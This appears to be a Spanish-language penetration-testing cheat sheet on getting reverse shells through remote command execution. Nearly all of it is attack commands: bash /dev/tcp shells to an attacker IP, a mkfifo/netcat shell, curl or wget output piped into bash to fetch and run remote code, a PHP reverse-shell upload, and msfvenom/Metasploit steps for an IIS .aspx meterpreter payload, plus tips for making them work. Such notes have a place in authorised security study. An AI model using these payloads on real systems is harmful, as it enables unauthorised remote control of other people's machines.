
### Técnicas para una reverse shell
#### Consideraciones
* **En ocasiones el PUERTO puede determinar que funcione o no**
* **Si no funciona, probar a cambiar el tipo de comillas "" '' **
* **Si metemos la reverse shell en la URL, mejor URLencodear el comando**.
* **Si metemos la reverse shell a través de un comando con un exploit en el terminal,  poner el comando entre comillas**

#### Reverse shell en la URL con BASH
Si tenemos ejecución remota de comandos a través de una URL, podemos establecer una reverse shell con bash.  Nos ponemos a la escucha y ejecutamos el comando en la URL.

```bash
"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
"bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"
```

### Reverse shell en la URL con mkfifo

URLencodeando esto, y poniendonos a la escucha con netcat, podemos establecer una reverse shell.
```bash
#Ponernos a la escucha en la maquina atacante
nc -nlvp 8888

#Comando a ejecutar en la URL
rm /tmpf;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.3:8888 >/tmp/f
```

#### File upload PHP
Si podemos subir ficheros, una opción es subir un php malicioso con el código de la reverse shell, ponernos a la escucha, y visitar el fichero/url
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

#### RCE con CURL en BASH
En ocasiones el comando en la URL no funciona, pero si ejecuta comandos. Se puede meter el codigo malicioso en un fichero index.html, servir esto con python, y hacer un curl desde la URL (teniendo RCE a través de la URL).

1º- Crear un fichero index.html con el siguiente contenido (una de las 3):
```bash
"bash -i >& /dev/tcp/10.0.0.1/443 0>&1"
'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'
"bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'"
```

2º- Servir con python y ponernos a la escucha con netcat:
```python
pyton3 -m http.server 80
nc -nlvp 443
```

3º - Hacer un curl desde la URL y pipeamos con bash para interpretar el código.
```bash
"curl 'http://ip' | bash"
"wget 'http://ip' | bash"
```

### Reverse Shell en IIS Windows
En IIS funciona totalmente distinto a nginx y apache. En caso de no tener PHP, se puede entablar una reverse shell subiendo un fichero **.aspx** malicioso.

Para ello se crea un payload con msfvenom y se sube a la víctima
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tu_ip LPORT=tu_puerto -f aspx > payload.aspx
```

En el atacante
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tu_ip
set LPORT tu_puerto
```
